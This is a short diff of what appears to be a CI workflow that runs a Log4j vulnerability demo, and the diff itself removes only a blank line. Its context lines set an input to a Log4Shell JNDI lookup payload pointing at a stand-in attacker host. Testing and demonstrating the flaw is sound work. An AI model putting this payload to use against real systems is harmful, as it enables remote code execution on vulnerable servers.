@@ -98,4 +98,3 @@ jobs:
           cd log4j-demo
           export UNSAFE_INPUT='${jndi:ldap://attacker.com/a}'
           mvn compile exec:java -Dexec.mainClass=com.example.Log4jVuln || true
-          
